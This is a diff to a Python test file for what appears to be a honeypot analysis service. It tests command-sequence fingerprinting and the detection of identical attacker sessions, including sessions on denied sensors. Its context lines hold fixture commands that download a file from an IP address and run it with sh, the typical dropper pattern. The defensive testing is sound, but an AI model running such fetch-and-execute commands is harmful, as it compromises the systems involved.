@@ -144,3 +144,83 @@ def test_fingerprint_ignores_volatile_literals_but_not_order() -> None:
     a = fingerprint(["wget http://1.2.3.4/x", "sh x"])
     assert a == fingerprint(["WGET  http://5.6.7.8/x", "sh x"])
     assert a != fingerprint(["sh x", "wget http://1.2.3.4/x"])
+
+
+# --- identical sessions: a pointer to an existing analysis, never a copy -----
+
+
+def _analysis(session_id: str, classification: str):
+    from app.db.models import Analysis
+
+    return Analysis(
+        id=uuid.uuid4(),
+        session_id=session_id,
+        model="test-fixture",
+        analysis_type="behavioral",
+        status="completed",
+        created_at=datetime.now(UTC),
+        duration_seconds=0,
+        classification=classification,
+        confidence=0.5,
+        risk_score=90,
+        risk="critical",
+        behavior_summary="fixture",
+        model_tier="local",
+        prompt_version="test",
+    )
+
+
+@contextlib.asynccontextmanager
+async def _analyses(*rows):
+    from sqlalchemy import delete
+
+    from app.db.models import Analysis
+    from app.db.session import get_session_factory
+
+    factory = get_session_factory()
+    async with factory() as db:
+        db.add_all(rows)
+        await db.commit()
+    try:
+        yield
+    finally:
+        async with factory() as db:
+            await db.execute(delete(Analysis).where(Analysis.id.in_([r.id for r in rows])))
+            await db.commit()
+
+
+async def test_a_twins_analysis_is_pointed_at_and_its_own_is_not(monkeypatch) -> None:
+    from app.services.campaigns import identical_sessions
+
+    async with (
+        _corpus(monkeypatch),
+        _analyses(_analysis("c-b", "dropper, seen before"), _analysis("c-a", "self")),
+    ):
+        twins = await identical_sessions("c-a")
+
+    assert twins.twin_count == 1
+    assert [(t.session_id, t.classification) for t in twins.analysed] == [
+        ("c-b", "dropper, seen before")
+    ]
+
+
+async def test_a_reordered_or_command_less_session_has_no_twin(monkeypatch) -> None:
+    from app.services.campaigns import identical_sessions
+
+    async with _corpus(monkeypatch):
+        reordered = await identical_sessions("c-c")
+        empty = await identical_sessions("c-d")
+
+    assert reordered.twin_count == 0 and reordered.fingerprint is not None
+    # c-d and c-e both ran nothing; an empty sequence must not make them twins.
+    assert empty.twin_count == 0 and empty.fingerprint is None
+
+
+async def test_a_twin_on_a_denied_sensor_is_not_revealed(monkeypatch) -> None:
+    from app.services.campaigns import identical_sessions
+
+    async with _corpus(monkeypatch), _analyses(_analysis("c-b", "on the hidden sensor")):
+        twins = await identical_sessions("c-a", deny_honeypots={"hp-b"})
+
+    assert twins.twin_count == 0
+    assert twins.analysed == []
